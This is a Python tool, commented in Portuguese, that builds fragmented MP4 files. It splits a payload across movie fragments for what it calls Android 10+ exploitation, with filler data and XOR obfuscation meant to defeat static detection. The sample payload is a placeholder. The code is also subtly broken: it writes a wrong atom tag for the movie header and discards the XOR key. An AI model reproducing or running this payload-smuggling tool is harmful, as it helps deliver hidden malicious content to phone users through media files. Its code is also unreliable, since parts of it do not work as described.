#!/usr/bin/env python3
"""
Injetor de Payload em Fragmented MP4 (fMP4)
Para exploração de Android 10+ com distribuição de payload em múltiplos fragments
"""

import struct
import os
from typing import List, Dict, Optional, Tuple
from enum import Enum


class fMP4AtomType(Enum):
    """Tipos de atoms em fMP4"""
    FTYP = b"ftyp"  # File type
    MDAT = b"mdat"  # Media data
    MOOV = b"moov"  # Movie metadata
    MOOF = b"moof"  # Movie fragment
    MFHD = b"mfhd"  # Movie fragment header
    TRAF = b"traf"  # Track fragment
    TFHD = b"tfhd"  # Track fragment header
    TRUN = b"trun"  # Track fragment run
    MFRA = b"mfra"  # Movie fragment random access
    FREE = b"free"  # Free space
    WIDE = b"wide"  # Wide atom (legacy)


class FragmentationStrategy(Enum):
    """Estratégias de fragmentação"""
    LINEAR = "linear"          # Payload espalhado linearmente
    INTERLEAVED = "interleaved"  # Payload intercalado com dados legítimos
    OBFUSCATED = "obfuscated"  # Payload ofuscado em múltiplos fragments


class fMP4Injector:
    """
    Injeta payload em arquivos fMP4 (Fragmented MP4).
    
    Vantagens sobre MP4 tradicional:
    - Payload espalhado em múltiplos fragments (moof)
    - Difícil de detectar por análise estática
    - Android processa fragments sequencialmente
    - Permite construção gradual do exploit na memória
    
    Estratégia:
    1. Criar múltiplos movie fragments (moof)
    2. Distribuir payload entre fragments
    3. Adicionar dados legítimos para disfarçar
    4. Manter arquivo playável
    """
    
    def __init__(self, mp4_path: Optional[str] = None):
        """
        Inicializa o injetor fMP4.
        
        Args:
            mp4_path: Caminho para arquivo MP4 existente (opcional)
        """
        self.mp4_path = mp4_path
        self.file_data = bytearray()
        self.atoms = []
        self.fragments = []
        
        if mp4_path and os.path.exists(mp4_path):
            with open(mp4_path, "rb") as f:
                self.file_data = bytearray(f.read())
    
    def create_ftyp_atom(self) -> bytes:
        """
        Cria um atom ftyp válido para fMP4.
        
        Returns:
            bytes: Atom ftyp
        """
        
        # Dados do ftyp
        major_brand = b"isom"
        minor_version = struct.pack(">I", 0x00000200)
        compatible_brands = b"isomiso2avc1mp41"
        
        data = major_brand + minor_version + compatible_brands
        
        # Header
        size = len(data) + 8
        atom = struct.pack(">I", size) + fMP4AtomType.FTYP.value + data
        
        return atom
    
    def create_moov_atom(self, duration: int = 1000) -> bytes:
        """
        Cria um atom moov mínimo válido.
        
        Args:
            duration: Duração em milissegundos
            
        Returns:
            bytes: Atom moov
        """
        
        # Criar mvhd (Movie Header)
        mvhd_data = bytearray()
        mvhd_data += b"\x00"  # Version
        mvhd_data += b"\x00\x00\x00"  # Flags
        mvhd_data += struct.pack(">I", 0)  # Creation time
        mvhd_data += struct.pack(">I", 0)  # Modification time
        mvhd_data += struct.pack(">I", 1000)  # Timescale
        mvhd_data += struct.pack(">I", duration)  # Duration
        mvhd_data += b"\x00\x01\x00\x00"  # Playback speed (1.0)
        mvhd_data += b"\x01\x00"  # Volume (1.0)
        mvhd_data += b"\x00" * 10  # Reserved
        mvhd_data += b"\x00\x01\x00\x00" * 3  # Matrix
        mvhd_data += b"\x00" * 24  # Preview time, duration, etc
        mvhd_data += struct.pack(">I", 2)  # Next track ID
        
        mvhd_size = len(mvhd_data) + 8
        mvhd_atom = struct.pack(">I", mvhd_size) + fMP4AtomType.MFHD.value + mvhd_data
        
        # Empacotar em moov
        moov_data = mvhd_atom
        moov_size = len(moov_data) + 8
        moov_atom = struct.pack(">I", moov_size) + fMP4AtomType.MOOV.value + moov_data
        
        return moov_atom
    
    def create_moof_fragment(
        self,
        fragment_number: int,
        payload_chunk: bytes,
        strategy: FragmentationStrategy = FragmentationStrategy.INTERLEAVED
    ) -> bytes:
        """
        Cria um movie fragment (moof) contendo payload.
        
        Args:
            fragment_number: Número do fragment
            payload_chunk: Dados do payload para este fragment
            strategy: Estratégia de fragmentação
            
        Returns:
            bytes: Movie fragment (moof + mdat)
        """
        
        # Criar mfhd (Movie Fragment Header)
        mfhd_data = bytearray()
        mfhd_data += b"\x00"  # Version
        mfhd_data += b"\x00\x00\x00"  # Flags
        mfhd_data += struct.pack(">I", fragment_number)  # Sequence number
        
        mfhd_size = len(mfhd_data) + 8
        mfhd_atom = struct.pack(">I", mfhd_size) + fMP4AtomType.MFHD.value + mfhd_data
        
        # Criar traf (Track Fragment)
        # Simplificado para foco na injeção
        traf_data = bytearray()
        
        # tfhd (Track Fragment Header)
        tfhd_data = bytearray()
        tfhd_data += b"\x00"  # Version
        tfhd_data += b"\x00\x00\x00"  # Flags
        tfhd_data += struct.pack(">I", 1)  # Track ID
        tfhd_data += struct.pack(">I", 0)  # Base data offset
        tfhd_data += struct.pack(">I", 0)  # Sample description index
        tfhd_data += struct.pack(">I", 0)  # Default sample duration
        tfhd_data += struct.pack(">I", 0)  # Default sample size
        tfhd_data += struct.pack(">I", 0)  # Default sample flags
        
        tfhd_size = len(tfhd_data) + 8
        tfhd_atom = struct.pack(">I", tfhd_size) + fMP4AtomType.TFHD.value + tfhd_data
        
        traf_data += tfhd_atom
        
        # trun (Track Fragment Run)
        trun_data = bytearray()
        trun_data += b"\x00"  # Version
        trun_data += b"\x00\x00\x0f"  # Flags (data offset, first sample flags, sample duration, size, flags)
        trun_data += struct.pack(">I", 1)  # Sample count
        trun_data += struct.pack(">I", 0)  # Data offset
        trun_data += struct.pack(">I", 0)  # First sample flags
        trun_data += struct.pack(">I", 1000)  # Sample duration
        trun_data += struct.pack(">I", len(payload_chunk))  # Sample size
        trun_data += struct.pack(">I", 0)  # Sample flags
        
        trun_size = len(trun_data) + 8
        trun_atom = struct.pack(">I", trun_size) + fMP4AtomType.TRUN.value + trun_data
        
        traf_data += trun_atom
        
        traf_size = len(traf_data) + 8
        traf_atom = struct.pack(">I", traf_size) + fMP4AtomType.TRAF.value + traf_data
        
        # Empacotar moof
        moof_data = mfhd_atom + traf_atom
        moof_size = len(moof_data) + 8
        moof_atom = struct.pack(">I", moof_size) + fMP4AtomType.MOOF.value + moof_data
        
        # Criar mdat (Media Data)
        # Estratégia de fragmentação
        if strategy == FragmentationStrategy.INTERLEAVED:
            # Intercalar payload com dados legítimos
            legitimate_data = b"\x00" * (len(payload_chunk) // 2)
            mdat_content = payload_chunk + legitimate_data
        elif strategy == FragmentationStrategy.OBFUSCATED:
            # Ofuscar payload com XOR
            import random
            xor_key = bytes([random.randint(0, 255) for _ in range(len(payload_chunk))])
            obfuscated = bytes([payload_chunk[i] ^ xor_key[i] for i in range(len(payload_chunk))])
            mdat_content = obfuscated
        else:  # LINEAR
            mdat_content = payload_chunk
        
        mdat_size = len(mdat_content) + 8
        mdat_atom = struct.pack(">I", mdat_size) + fMP4AtomType.MDAT.value + mdat_content
        
        # Combinar moof + mdat
        fragment = moof_atom + mdat_atom
        
        return fragment
    
    def fragment_payload(
        self,
        payload: bytes,
        fragment_count: int = 4,
        strategy: FragmentationStrategy = FragmentationStrategy.INTERLEAVED
    ) -> List[bytes]:
        """
        Fragmenta o payload em múltiplos chunks.
        
        Args:
            payload: Payload completo
            fragment_count: Número de fragments
            strategy: Estratégia de fragmentação
            
        Returns:
            List[bytes]: Lista de fragments
        """
        
        fragments = []
        chunk_size = len(payload) // fragment_count
        
        for i in range(fragment_count):
            start = i * chunk_size
            if i == fragment_count - 1:
                # Último fragment pega o resto
                end = len(payload)
            else:
                end = start + chunk_size
            
            chunk = payload[start:end]
            fragment = self.create_moof_fragment(i + 1, chunk, strategy)
            fragments.append(fragment)
        
        self.fragments = fragments
        return fragments
    
    def build_fmp4_file(
        self,
        payload: bytes,
        fragment_count: int = 4,
        strategy: FragmentationStrategy = FragmentationStrategy.INTERLEAVED
    ) -> bytes:
        """
        Constrói um arquivo fMP4 completo com payload injetado.
        
        Estrutura:
        ftyp -> moov -> moof1 + mdat1 -> moof2 + mdat2 -> ... -> mfra
        
        Args:
            payload: Payload a injetar
            fragment_count: Número de fragments
            strategy: Estratégia de fragmentação
            
        Returns:
            bytes: Arquivo fMP4 completo
        """
        
        fmp4_file = bytearray()
        
        # 1. ftyp (File Type)
        ftyp = self.create_ftyp_atom()
        fmp4_file += ftyp
        
        # 2. moov (Movie Metadata)
        moov = self.create_moov_atom()
        fmp4_file += moov
        
        # 3. Fragmentar payload e criar moof + mdat
        fragments = self.fragment_payload(payload, fragment_count, strategy)
        for fragment in fragments:
            fmp4_file += fragment
        
        # 4. mfra (Movie Fragment Random Access) - opcional
        # Permite seek em arquivo fMP4
        mfra = self.create_mfra_atom(fragment_count)
        fmp4_file += mfra
        
        return bytes(fmp4_file)
    
    def create_mfra_atom(self, fragment_count: int) -> bytes:
        """
        Cria um atom mfra (Movie Fragment Random Access).
        
        Args:
            fragment_count: Número de fragments
            
        Returns:
            bytes: Atom mfra
        """
        
        mfra_data = bytearray()
        
        # mfro (Movie Fragment Random Access Offset)
        mfro_data = bytearray()
        mfro_data += b"\x00"  # Version
        mfro_data += b"\x00\x00\x00"  # Flags
        mfro_data += struct.pack(">I", 0)  # Size of mfra
        
        mfro_size = len(mfro_data) + 8
        mfro_atom = struct.pack(">I", mfro_size) + b"mfro" + mfro_data
        
        mfra_data += mfro_atom
        
        mfra_size = len(mfra_data) + 8
        mfra_atom = struct.pack(">I", mfra_size) + fMP4AtomType.MFRA.value + mfra_data
        
        return mfra_atom
    
    def save_fmp4(self, output_path: str, fmp4_data: bytes) -> bool:
        """
        Salva arquivo fMP4.
        
        Args:
            output_path: Caminho para salvar
            fmp4_data: Dados do arquivo fMP4
            
        Returns:
            bool: True se sucesso
        """
        
        try:
            with open(output_path, "wb") as f:
                f.write(fmp4_data)
            
            file_size = os.path.getsize(output_path)
            print(f"[+] fMP4 salvo: {output_path}")
            print(f"[+] Tamanho: {file_size} bytes")
            
            return True
        
        except Exception as e:
            print(f"[!] Erro ao salvar fMP4: {e}")
            return False
    
    def get_fmp4_info(self, fmp4_data: bytes) -> Dict:
        """
        Retorna informações sobre o arquivo fMP4.
        
        Returns:
            Dict: Informações
        """
        
        return {
            "file_size": len(fmp4_data),
            "fragment_count": len(self.fragments),
            "fragments": [
                {
                    "number": i + 1,
                    "size": len(frag),
                }
                for i, frag in enumerate(self.fragments)
            ]
        }


def main():
    """Teste do injetor fMP4"""
    
    # Criar payload de teste
    payload = b"EXPLOIT_PAYLOAD_MODERN_LITE" * 50  # ~1.4 KB
    
    print("[*] Criando arquivo fMP4 com payload injetado...")
    
    # Criar injetor
    injector = fMP4Injector()
    
    # Construir fMP4
    fmp4_data = injector.build_fmp4_file(
        payload=payload,
        fragment_count=4,
        strategy=FragmentationStrategy.INTERLEAVED
    )
    
    # Salvar
    output_path = "modern_exploit.fmp4"
    if injector.save_fmp4(output_path, fmp4_data):
        print("[+] fMP4 criado com sucesso")
    
    # Exibir informações
    info = injector.get_fmp4_info(fmp4_data)
    print(f"\n[*] Informações do fMP4:")
    print(f"    Tamanho total: {info['file_size']} bytes")
    print(f"    Fragments: {info['fragment_count']}")
    for frag_info in info['fragments']:
        print(f"      Fragment {frag_info['number']}: {frag_info['size']} bytes")


if __name__ == "__main__":
    main()
